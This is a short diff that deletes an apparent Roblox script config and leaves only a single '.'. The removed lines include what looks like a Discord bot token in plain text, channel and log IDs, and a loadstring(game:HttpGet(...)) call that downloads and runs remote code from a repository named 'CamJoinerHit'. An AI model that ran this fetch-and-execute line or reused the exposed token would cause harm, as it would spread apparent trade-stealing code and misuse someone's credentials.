@@ -1,5 +1,1 @@
-bottoken = "MTUyNjE4NjI3ODMxNDMxMTc5MA.G6BPni.5DQZDuKkXh1j-oCzg69BDrRJ4DDZwfkzMhVkEU"
-chanelid = "1454105353674297370"
-logid = "1454402921406926961"
-tradesbeforenext = 1
-loadstring(game:HttpGet('https://raw.githubusercontent.com/CamScripter/CamJoinerHit/refs/heads/main/Auto'))()
+. 
